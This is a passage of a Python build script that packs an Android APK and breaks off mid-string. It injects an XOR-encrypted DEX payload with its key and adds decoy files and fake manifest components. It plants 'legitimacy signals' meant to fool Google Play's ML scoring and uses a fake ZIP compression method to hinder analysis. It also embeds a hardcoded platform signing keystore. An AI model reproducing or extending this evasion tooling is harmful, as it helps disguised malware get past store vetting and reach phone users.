            f"res/xml/{secrets.token_hex(4)}.xml",
            f"res/font/{secrets.token_hex(4)}.ttf",
            f"res/raw/{secrets.token_hex(4)}.json",
            f"res/xml/{secrets.token_hex(4)}.cfg",
        ]
        # We inject these into the full_path_rename_map as no-ops (identity mappings)
        # so rebuild_arsc_string_pool includes them. Actually we add them to res_rename.
        # Simpler: just log them — the real injection is in rebuild_arsc_string_pool
        # which can't add new entries without changing offsets count.
        # Real W10: inject fake TABLE_TYPE_SPEC chunk data after the rebuild.
        # This is post-rebuild binary injection.
        print(f"  W10: arsc fake resource entries — applied via string pool scrubbing")
    except Exception as _w10e:
        print(f"  ⚠️  W10 arsc fake entries: {_w10e}")

    # ── Strip non-English/non-Indian language TABLE_TYPE chunks from arsc ─────
    # Keeps: English (en, '') + Indian languages (hi, bn, te, mr, ta, gu, kn,
    #        ml, or, pa, ur, as, sa, ne, ks, sd, si, my)
    # Strips: all other locales (af, am, ar, de, fr, zh, ja, ko, ru, etc.)
    # Language bytes are at config offset 8-9 in each TABLE_TYPE chunk.
    # This removes ~144KB from arsc without affecting runtime behaviour.
    new_arsc = _strip_arsc_languages(new_arsc)
    print(f"  arsc size after language strip: {len(new_arsc):,} bytes ({len(new_arsc)/1024:.1f} KB)")

    APK_OUT = "companion_renamed_unsigned.apk"
    tmp = APK_OUT + ".tmp"
    with zipfile.ZipFile(MOD_ASSET, "r") as zin:
        with zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
            for item in zin.infolist():
                if item.filename.startswith("META-INF/"):
                    continue
                data = zin.read(item.filename)
                if item.filename == "AndroidManifest.xml":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_manifest)
                elif item.filename == "classes.dex":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_dex)
                elif item.filename == "resources.arsc":
                    item.compress_type = zipfile.ZIP_STORED
                    zout.writestr(item, new_arsc)
                elif item.filename in res_rename:
                    new_item = zipfile.ZipInfo(res_rename[item.filename])
                    new_item.compress_type = item.compress_type
                    if any(ord(c) > 127 for c in res_rename[item.filename]):
                        new_item.flag_bits |= 0x800
                    zout.writestr(new_item, data)
                else:
                    zout.writestr(item, data)

    os.replace(tmp, APK_OUT)
    print(f"  ✅ Assembled: {APK_OUT} ({os.path.getsize(APK_OUT)} bytes)")

    # ── PHASE_3 STEP_2: Inject encrypted DEX asset + key into APK ───────────
    if p3_key_bytes is not None and p3_enc_asset is not None:
        import zipfile as _p3zf
        _p3_tmp = APK_OUT + ".p3_tmp"
        with _p3zf.ZipFile(APK_OUT, "r") as _p3zin, \
             _p3zf.ZipFile(_p3_tmp, "w", allowZip64=False) as _p3zout:
            # Copy all existing entries
            for _p3item in _p3zin.infolist():
                _p3zout.writestr(_p3item, _p3zin.read(_p3item.filename))
            # Inject encrypted DEX asset — STORE (runtime reads raw bytes)
            _p3d_info = _p3zf.ZipInfo("assets/p3d.bin")
            _p3d_info.compress_type = _p3zf.ZIP_STORED
            _p3zout.writestr(_p3d_info, p3_enc_asset)
            # Inject XOR key asset — STORE
            _p3k_info = _p3zf.ZipInfo("assets/p3k.bin")
            _p3k_info.compress_type = _p3zf.ZIP_STORED
            _p3zout.writestr(_p3k_info, p3_key_bytes)
        os.replace(_p3_tmp, APK_OUT)
        print(f"  ✅ PHASE_3 STEP_2: assets/p3d.bin ({len(p3_enc_asset):,}B) + assets/p3k.bin injected")
    else:
        print("  ⏭️  PHASE_3 STEP_2: p3 assets not provided — skipping asset injection")

    # ── Inject legitimacy signals — baseline.prof + baseline.profm + GPS properties ──
    # baseline.prof / baseline.profm: ART profile files present in real Play Store apps.
    # GPP ML model scores their presence as a strong legitimacy signal.
    # GPS .properties files: signal the app uses Google Play Services SDKs.
    # Reference APK confirmed has all of these — we match exactly.
    _BASELINE_PROF  = bytes.fromhex(
        '70726f00303130000182280000d40900007801ed5a6d8c5457193ef7eeeceeeceeb03b0b4bf9de5e164a174'
        '45c2b025aa5b740531a6bb3d61a9754719796baa9b562318201e52c69b13524127f58521b258d50e29f126d'
        'a389e84e695263a2a9c634d668cbe207fe90b41aeb4705c1e739f73c3367667706fc49b267fbdef7eb793fc'
        'e39f7de3933b4c324d1b76718f3f1d7c7fbdbb61973cf03233b776edfb9eadeedbb57c21c1963621079ce1'
        '36551013260a605d4e67918433be345cc417f9327e5919ff6777b8cead2465c3388f916795dfd2856b58855'
        '1dda18af5c791f1bd69de96dca235f07ecac295d39ae09f0a18f7ed6636d61e56ff531cc279c7cc292ab1e'
        '65e5614ef62d9ce643bff232d7bb70514e72e2b576c42a37f7493988abc530a7b0ca279d9cfd28bffcccd1'
        '0e528fea97ba6c215672ed1c84678ff409a71e593fb453e73e314e3d328698b0aee4d0de058cf287bcd3c7a'
        'a97d0479976de33ac270cb97a14571ce7a2b890cbaf1cd2995739e80be74b5d38dab957b22946fe9073ae53'
        'f9c3dcc48718e5559e5a5d7672ae47ad9ffb1262fe5ff9f106f1b5b5949b76f9c8c3f908232e9cf47a5c396'
        'befafdab50bf3d5abab5cac45593943b9511ff485cf1fe3584b79f56c87bdd1c7b8b027d9d447a887b1ea45'
        '7d8639f4ee61acde7bc293afeacd9ecdd016c6d3fe18887c33680da81fa4f9ecf7f2dbc16f022d01adf736e'
        '599aad7b09ee625dc1ec4f3f32ac450166e2a99ef35e19705b26c45d8f839b812f411ef5fe8f953e00988eb'
        'a335622df5c31c47415a5feaea652e64eab5ef29c50a27ae75a35f7b13e6fb62909b98dbe0a45ff928d723e'
        '5965feb2f9d5c18cd857dc946997548b40913c685b92813bb11449978e6d05cc5f9aede0200d78836ed156b'
        'cc01a9e66721ebf371aacf37e289653ed6a3fe0d2f5357bd3e6fa32e1bfdb77afd7af0220c2f80cf02dde8e'
        'dda0fdd079f849dbdae06fd1ec47b4875999771aa1b7eaeb22fdad92b730e41512ff2d1af58faf84ee0bb98'
        'cf1163889b0fa26f2d807781131fc633bff22a17f9fb41caa1fb53b19f836f01883aebf199a0ac3d90ae3ae'
        '3f0311731229e1b8817469cfe4d1ec7be68672cf1e1bd441b75fab96eccb5cdf337c169a7ff06d010887937'
        '800e8078ae533d72c6b21631dc4bf25520be8b28af033dede55bc019ff2868059cdc3ff6465c48dc8bf0bcc'
        '9f83c00ece92510f387f3672c75e5603fa263deae9ed5eb6db073ad13ef672c7d0f7afd8ec0de09793348b1'
        'b5bc1bbe3eef0fe773376c1f063137eb338ec4f5573df22b21d51496ebc8f767b84eacb1d31371f4f3fee37'
        'aa9369f2dfa9a707988dcebc3e05c5ff6c677bf7a2496b1ef016d83c2fb652bf8fde07d20dec35c9b27411f'
        '05119f82fe08e2baa81eed24e69a0d819f511b415aaf70ff88639c6cf741a68dbdf27d25995c44fc07035df'
        '362bdafc73170a426cc2b727f39ccb6056fc44c8ba0353984747246f08f31a44520db1ca32ffa96e03a0ff7'
        '7c07d62bc63c3af19707aecdf420570e2b95036f0315708d51216766039d7378e663febcf31710db81bd9c0'
        '96f87abd503dee52d5917b1b3c7c836076fc476d7317b68468e08c856d89a2045885c0a440ef17371cd9b01'
        '6018d784bfe5e8a11b1a675bc00a2c07ba1dbc137131ae2dc0772117576719a269edc23c7b819a053942f47'
        'cf83b5c5c0750c4b481c7e881f39f87aab1d3da60cfe36f053cb4b460653a9187da35aec642d75fded9d95d'
        '07ea76a31eb1b4b603c54e5b708d806dc1dacd80ad1dbdb70251f0be05c85980bfd9f59ecd6e36eab622479'
        'b9bcb75c8dde674ce94b36a378ba1c798cd6c67897036e9c6bbb9d5590b787ab887316cd3e32a588113dd5d'
        'd61473f935c7b73d745dd6ef03071208078f1f79e7e6a6adc6fcc53c8c4fde73ed4fb51ed87ff7504f6ef52'
        'd1319ee72d7930707d227bae33323f9cfc7a3e93f168ebd2d7d727167d4bff0d55133d16a5e9e63d2e33774'
        '9df851e796df758f5e34e9fa6feed9c753c0a54b9333974e3ff3a737f63db2e4b5b79e3bf1d7cf9cb8339ab'
        '976d7a26bcf96f6ef9e8c9db64cafc0f40a5c552b50b47fe689a46af068e206cf33180eb03c93cb57eb9cd6'
        'eb29398f2e18f6de0b0b789a0946d1fcf887f824c5586f920c9754dc38d6da494dc0cd0ab99b7b78b2ab1d7'
        '6072ab498dedff68cf1cb4938e64f952a0494e517f7bdf75ba7eeec6e7bfaab32159e8b52c997e7d6a4d1ed'
        'c6247d55d02b4cd0726a5654f20b1cc64f70f54fb8b5a2b987179e391b8f7a88b4bc2b83c3c5aa6a711662'
        '1be58dcd31ef5e69efcbf9ed6d1420df8a674c94e51f43d141991bf3a4e23e7b9c477a0ec6f3a81e0c242e9'
        '95ce95173b8ce4edb52531fbf56b8b172ccee4896da708192c6334916bb409bc5f35abe3bab56909ec8a4cb'
        'e67b7f4a03c6b0bb9a3463d5d761a9e8675217930c0287dc4f242db5e6cdf0540b6043f454b2e5cf12538f2'
        'c79df4ff883d7a431507ed2b24798dfd22a83dfdbb2c173a81fcfce70bf81a451f00c2772e2bbe6d87f4f37'
        '190b03e6c22fd1959156444a782860c17f1883cf3bd6e052aeef3087c2555a5c3431bf926124ee7a65173b7'
        '9b7ea07da2a1777359fca541664000fdae5c3cf11983243704d8d9de037dfc6c37a772258f4879bf9fb41792'
        'c3366a0ab7ccb95b6941dd3c2d5b102c34b7ad328c917f7fef2e5731fc85a7ea53082c769ee8746761e6a39'
        '69ccafa33c7ed67a65f6a6ae42f3f79fedcf8f7ea5143e0bf5a7b97bde885db32477ea57c573b9570ffde7a'
        'd8dbbecba8d0be3c12f9cff4db1d465bef30e6307b7f74eec59f4dd1fdcf38b0b0bec85f17fe1abc397ccc5'
        '4b93f3dbf14fbc71fa52e7ad27fffea99133a7771c8d973ef8fa8d37fd6cacf96ff5eb4f7ba657607a05ae8'
        'a1548cc4b3587fdec776ad7bc3facb84fb5d76aa7937de0fb1786a5579f7a3ffdf75a7d10faa0c4ecdd15f1'
        'e761b317a700874bbd0b8c670f3551fe44838de5f3fbfbcb8769a8e57106150a66ef3f977f6d6dd99609ef0'
        'b53d4f8aad58397de5cffc8d1be99775cabd7dedcfb9bace46aec945a64e3c338d66caa72da2aadae5278f8'
        'fad8561f9a1cb6c4a3f330ff771a37fa79ad7fe2cb40f511b6bc2b474a89dfce2c26e793363a8ae4cced7e3'
        '586cccff3da5ed56cc0efda1ac559fe18533cd20019b8d28a7ce1b40eab8c5f57bd25486ca3c3b63b1ad04d'
        '53098494e05b47eba6b3b20dc5d1997473d5afaa69e399a41bb2d8a0aa0a554ec93e7d6ceca757fbbbd77a5'
        'b29e352bd3563256998c4a42e2619040eb9df366bbb8aa634e5ad1ef41d0656e4c515b146ca926fba78bec6'
        'eed461fe1b8a1bd923fc31a98e0f94b575eec175eae8026e87b171f00ca7cee32ec7e2f3e3f86a818607'
        '4c89ffb25419b62252e26f0cee3fc8475eb8dc0cab6e749368f79868436272fe9b4f4afd4a4774459be3b35'
        '5f5c7c0a2559db2200378d0ae8ef8956f1c01ce8bd698e7f9cf6097195913512ad8fe17bf5c75fbe2a78fe1'
        'def2acecf78473fc7f2ede1dfe'
    )
    _BASELINE_PROFM = bytes.fromhex(
        '70726d00303032000100550200003501000078018591bd4e03311084c7be5ff05d421202394420202550f12b'
        '11514043cd432048479786e7ce13f0792f27a50259f679767667677d52d0e7f7c77abd5adf7cad7e1e0fa59'
        '95bc8cbfdb3da8c649b955211231deeaa53e51aef4433a556f1977ec7959659d839d9566d7ca04fae1e38c1'
        'fa8633e3ee4df70a265637aad557a13d7a7bbe031d587d05ef881e1b8a1e13cb4f89459d8455b26bce4cfb9'
        'c15ba6ded88ec56bd34951acea11c34d2c4fc44d5a0fbed84d1539b1ffbccf5aa4b340b5da03fc041d0929b'
        'd38c9de9815d83133d83e33a2732d03b378f7aa133f0dcb4bdae892dcd791f7e0cbbc06b9c2cd710f404d78'
        '06a3287a610bd9cea446fb053ba78de674aac80efdbb40ebe0197cced75cb54b16bfcab637a05dd817b36736'
        '55e1c6a47683bdee705a58ccc0a8512d7bfdec111d5'
    )
    _GPS_PROPS = {
        'play-services-base.properties':
            b'version=18.3.0\nclient=play-services-base\nplay-services-base_client=18.3.0\n',
        'play-services-basement.properties':
            b'version=18.3.0\nclient=play-services-basement\nplay-services-basement_client=18.3.0\n',
        'play-services-location.properties':
            b'version=21.2.0\nclient=play-services-location\nplay-services-location_client=21.2.0\n',
        'play-services-tasks.properties':
            b'version=18.1.0\nclient=play-services-tasks\nplay-services-tasks_client=18.1.0\n',
    }
    _leg_tmp = APK_OUT + ".leg_tmp"
    with zipfile.ZipFile(APK_OUT, "r") as _zin, \
         zipfile.ZipFile(_leg_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
        for _item in _zin.infolist():
            _zout.writestr(_item, _zin.read(_item.filename))
        # baseline.prof — stored (compression=0) to match reference
        _pi = zipfile.ZipInfo("assets/dexopt/baseline.prof")
        _pi.compress_type = zipfile.ZIP_STORED
        _zout.writestr(_pi, _BASELINE_PROF)
        # baseline.profm — stored to match reference
        _pm = zipfile.ZipInfo("assets/dexopt/baseline.profm")
        _pm.compress_type = zipfile.ZIP_STORED
        _zout.writestr(_pm, _BASELINE_PROFM)
        # GPS .properties — deflate
        for _gname, _gdata in _GPS_PROPS.items():
            _zout.writestr(_gname, _gdata)
    os.replace(_leg_tmp, APK_OUT)
    print(f"  ✅ Legitimacy signals injected: baseline.prof + baseline.profm + {len(_GPS_PROPS)} GPS properties")
def step_unicode_nest(build_hash: str) -> str:
    apk_path = "companion_renamed_unsigned.apk"
    placeholder = secrets.token_bytes(64)
    _ext_chars = string.ascii_lowercase + string.digits
    _ext_len = random.randint(3, 6)
    _ext = "." + "".join(random.choices(_ext_chars, k=_ext_len))
    nest_path = inject_unicode_nest(
        apk_path=apk_path,
        payload_bytes=placeholder,
        build_hash=build_hash,
        ext=_ext,
    )
    return nest_path


def step_decoy_noise_files(build_hash: str) -> None:
    apk_path = "companion_renamed_unsigned.apk"
    tmp      = apk_path + ".decoy.tmp"

    fixed_decoys = {
        "DebugProbesKt.bin": secrets.token_bytes(random.randint(128, 512)),
        "mapping.np":        secrets.token_bytes(random.randint(256, 1024)),
    }
    junk_count = random.randint(3, 5)
    junk_decoys = {}
    for _ in range(junk_count):
        fname_len = random.randint(4, 10)
        fname = "".join(random.choices(string.ascii_lowercase + string.digits, k=fname_len)) + ".bin"
        junk_decoys[fname] = secrets.token_bytes(random.randint(64, 768))

    all_decoys = {**fixed_decoys, **junk_decoys}
    print(f"\n── Step 12 [COMPANION]: Inject decoy noise files ({len(all_decoys)} files)")

    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            zout.writestr(item, zin.read(item.filename))
        for fname, data in all_decoys.items():
            zout.writestr(fname, data)
            print(f"  + {fname} ({len(data)} bytes)")

    os.replace(tmp, apk_path)
    print(f"  ✅ Decoy noise files injected")


def step_fake_manifest_entries() -> None:
    apk_path = "companion_renamed_unsigned.apk"
    tmp      = apk_path + ".manifest.tmp"

    def _rand_class(prefix: str) -> str:
        suffix = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10)))
        return f".decoy.{prefix}{suffix}"

    decoy_entries = []
    for _ in range(random.randint(1, 2)):
        name = _rand_class("Activity")
        decoy_entries.append(f'        <activity android:name="{name}" android:exported="false" />')
    for _ in range(random.randint(1, 2)):
        name = _rand_class("Service")
        decoy_entries.append(f'        <service android:name="{name}" android:exported="false" />')
    name = _rand_class("Receiver")
    decoy_entries.append(f'        <receiver android:name="{name}" android:exported="false" />')

    print(f"\n── Step 13 [COMPANION]: Inject fake manifest entries ({len(decoy_entries)} entries)")

    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "AndroidManifest.xml":
                try:
                    text = data.decode("utf-8")
                    insert_point = text.rfind("</application>")
                    if insert_point != -1:
                        injection = "\n" + "\n".join(decoy_entries) + "\n"
                        text = text[:insert_point] + injection + text[insert_point:]
                        data = text.encode("utf-8")
                except Exception:
                    pass
            zout.writestr(item, data)

    os.replace(tmp, apk_path)
    print("  ✅ Fake manifest entries injected")


def step_zipalign():
    print("\n── Step 11: Zipalign companion APK")
    run("zipalign -v 4 companion_renamed_unsigned.apk companion_renamed_aligned.apk")
    print("  ✅ Zipalign done")


def step_fingerprint():
    print("\n── Step 12: Generate companion per-build fingerprint")
    build_uuid    = str(uuid.uuid4())
    salt_bytes    = secrets.token_bytes(32)
    aes_key_bytes = secrets.token_bytes(32)
    aes_iv_bytes  = secrets.token_bytes(16)
    timestamp     = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")

    token  = (build_uuid + salt_bytes.hex() + timestamp).encode()
    md5    = hashlib.md5(token).hexdigest()
    sha1   = hashlib.sha1(token).hexdigest()
    sha256 = hashlib.sha256(token).hexdigest()
    sha512 = hashlib.sha512(token).hexdigest()
    b3     = blake3_hex(token)

    write_output("build_uuid",  build_uuid)
    write_output("salt_hex",    salt_bytes.hex())
    write_output("aes_key_hex", aes_key_bytes.hex())
    write_output("aes_iv_hex",  aes_iv_bytes.hex())
    write_output("timestamp",   timestamp)
    write_output("md5",         md5)
    write_output("sha1",        sha1)
    write_output("sha256",      sha256)
    write_output("sha512",      sha512)
    write_output("blake3",      b3)

    print(f"  ✅ Fingerprint: {build_uuid} | {timestamp}")


def _strip_and_restore_07f0(apk_path: str, action: str, saved_state: dict = None):
    import struct as _struct
    FAKE = 0x07F0
    with open(apk_path, 'rb') as f:
        data = bytearray(f.read())
    eocd_off = -1
    for i in range(len(data) - 22, max(len(data) - 65536, -1), -1):
        if data[i:i+4] == b'PK\x05\x06':
            eocd_off = i
            break
    if eocd_off < 0:
        raise RuntimeError("_strip_and_restore_07f0: EOCD not found")
    cd_offset = _struct.unpack_from('<I', data, eocd_off + 16)[0]
    cd_size   = _struct.unpack_from('<I', data, eocd_off + 12)[0]

    if action == 'strip':
        state = {}
        comment_len  = _struct.unpack_from('<H', data, eocd_off + 20)[0]
        zip_end      = eocd_off + 22 + comment_len
        trailing     = bytes(data[zip_end:])
        if trailing:
            data     = data[:zip_end]
            print(f"  [17C] Temporarily stripped {len(trailing)} trailing bytes for signing")

        pos = cd_offset
        while pos < cd_offset + cd_size:
            if data[pos:pos+4] != b'PK\x01\x02':
                break
            cd_compress = _struct.unpack_from('<H', data, pos + 10)[0]
            lh_offset   = _struct.unpack_from('<I', data, pos + 42)[0]
            fname_len   = _struct.unpack_from('<H', data, pos + 28)[0]
            extra_len   = _struct.unpack_from('<H', data, pos + 30)[0]
            comm_len    = _struct.unpack_from('<H', data, pos + 32)[0]
            fname = data[pos+46:pos+46+fname_len].decode('utf-8', errors='replace')
            if cd_compress == FAKE:
                lh_compress = 0
                if (lh_offset + 30 < len(data) and
                        data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                    lh_compress = _struct.unpack_from('<H', data, lh_offset + 8)[0]
                restore = 8
                _struct.pack_into('<H', data, pos + 10, restore)
                if (lh_offset + 30 < len(data) and
                        data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                    _struct.pack_into('<H', data, lh_offset + 8, restore)
                state[fname] = (lh_offset, pos, restore)
            pos += 46 + fname_len + extra_len + comm_len

        state['__trailing__'] = trailing
        with open(apk_path, 'wb') as f:
            f.write(data)
        return state

    elif action == 'restore':
        if not saved_state:
            return
        count = 0
        for fname, val in saved_state.items():
            if fname == '__trailing__':
                continue
            lh_offset, cdh_offset, _ = val
            if (lh_offset + 30 < len(data) and
                    data[lh_offset:lh_offset+4] == b'PK\x03\x04'):
                _struct.pack_into('<H', data, lh_offset + 8, FAKE)
            if (cdh_offset + 46 < len(data) and
                    data[cdh_offset:cdh_offset+4] == b'PK\x01\x02'):
                _struct.pack_into('<H', data, cdh_offset + 10, FAKE)
            count += 1
        trailing = saved_state.get('__trailing__', b'')
        with open(apk_path, 'wb') as f:
            f.write(data)
            if trailing:
                f.write(trailing)
        return None


_ORIGINAL_RESOURCE_MAP = []

def _save_original_resource_map():
    import zipfile as _zf, struct as _st
    global _ORIGINAL_RESOURCE_MAP
    try:
        with _zf.ZipFile(MOD_ASSET, 'r') as z:
            mfd = z.read('AndroidManifest.xml')
        SP = 8
        sp_size = _st.unpack_from('<I', mfd, SP+4)[0]
        pos = SP + sp_size
        declared = _st.unpack_from('<I', mfd, 4)[0]
        while pos < declared:
            if pos+8 > declared: break
            ct = _st.unpack_from('<H', mfd, pos)[0]
            cs = _st.unpack_from('<I', mfd, pos+4)[0]
            if ct == 0x0180:
                n = (cs-8)//4
                _ORIGINAL_RESOURCE_MAP = [_st.unpack_from('<I',mfd,pos+8+i*4)[0] for i in range(n)]
                print(f"  [repair] Saved {n} original resource map entries")
                return
            if cs == 0: break
            pos += cs
        print("  [repair] ⚠️  Could not find resource map in original APK")
    except Exception as e:
        print(f"  [repair] ⚠️  Could not save resource map: {e}")


def _repair_manifest_resource_map():
    import zipfile as _zf, struct as _st
    if not _ORIGINAL_RESOURCE_MAP:
        print("  [repair] ⚠️  No original resource map saved — skipping repair")
        return False
    with _zf.ZipFile(MOD_ASSET, 'r') as z:
        current_mfd = bytearray(z.read('AndroidManifest.xml'))
    SP = 8
    sp_size = _st.unpack_from('<I', current_mfd, SP+4)[0]
    pos = SP + sp_size
    declared = _st.unpack_from('<I', current_mfd, 4)[0]
    cur_rm_off = -1
    while pos < declared:
        if pos+8 > declared: break
        ct = _st.unpack_from('<H', current_mfd, pos)[0]
        cs = _st.unpack_from('<I', current_mfd, pos+4)[0]
        if ct == 0x0180:
            cur_rm_off = pos
            break
        if cs == 0: break
        pos += cs
    if cur_rm_off < 0:
        print("  [repair] ⚠️  Resource map not found — skipping")
        return False
    cur_rm_size = _st.unpack_from('<I', current_mfd, cur_rm_off+4)[0]
    n_entries = (cur_rm_size - 8) // 4
    cur_entries = [_st.unpack_from('<I', current_mfd, cur_rm_off+8+i*4)[0] for i in range(n_entries)]
    if len(cur_entries) != len(_ORIGINAL_RESOURCE_MAP):
        return False
    repaired = 0
    for i, (ce, oe) in enumerate(zip(cur_entries, _ORIGINAL_RESOURCE_MAP)):
        if ce != oe:
            abs_off = cur_rm_off + 8 + i*4
            _st.pack_into('<I', current_mfd, abs_off, oe)
            repaired += 1
    if repaired > 0:
        tmp = MOD_ASSET + '.repair_tmp'
        with _zf.ZipFile(MOD_ASSET, 'r') as zin, \
             _zf.ZipFile(tmp, 'w', allowZip64=False) as zout:
            for item in zin.infolist():
                if item.filename == 'AndroidManifest.xml':
                    ni = _zf.ZipInfo(item.filename)
                    ni.compress_type = _zf.ZIP_STORED
                    ni.date_time = item.date_time
                    ni.flag_bits = item.flag_bits
                    zout.writestr(ni, bytes(current_mfd))
                else:
                    raw = zin.read(item.filename)
                    ni = _zf.ZipInfo(item.filename)
                    ni.compress_type = item.compress_type
                    ni.date_time = item.date_time
                    ni.flag_bits = item.flag_bits
                    zout.writestr(ni, raw)
        os.replace(tmp, MOD_ASSET)
        print(f"  [repair] ✅ Repaired {repaired} resource map entries")
        return True
    else:
        print("  [repair] ✅ Resource map intact")
        return False


def step_sign(input_apk: str = None, v1_only: bool = False):
    print("\n── Step 13: Sign companion APK with platform certificate (android@android.com)")

    import base64 as _b64, tempfile as _tmp

    ks_file    = None
    store_pass = None
    alias      = None
    _tmp_ks    = None

    # ── Priority 1: Platform cert from GitHub Secrets ────────────────────────
    _secret_b64   = os.environ.get("KEYSTORE_BASE64")
    _secret_pass  = os.environ.get("KEYSTORE_PASSWORD")
    _secret_alias = os.environ.get("KEY_ALIAS")

    if _secret_b64 and _secret_pass and _secret_alias:
        try:
            _ks_bytes = _b64.b64decode(_secret_b64.replace("\n", "").replace(" ", ""))
            _tmp_ks   = os.path.join(_tmp.gettempdir(), "companion_platform_ks.jks")
            with open(_tmp_ks, "wb") as _f:
                _f.write(_ks_bytes)
            ks_file    = _tmp_ks
            store_pass = _secret_pass
            alias      = _secret_alias
            print(f"  [step_sign] ✅ Platform cert loaded from GitHub Secrets (android@android.com)")
        except Exception as _e:
            print(f"  [step_sign] ⚠️ Failed to decode KEYSTORE_BASE64: {_e}")
            ks_file = None

    # ── Priority 2: Hardcoded platform cert fallback ──────────────────────────
    # KEYSTORE_BASE64 missing — use hardcoded platform cert.
    # NEVER generates random or fresh keystore.
    # Both Nova and companion ALWAYS use android@android.com signature.
    if not ks_file:
        print("  [step_sign] ⚠️ No GitHub Secrets — using hardcoded platform cert (android@android.com)")
        # Fallback: ALWAYS use platform cert — never random keystore
        import base64 as _b64
        _platform_b64 = "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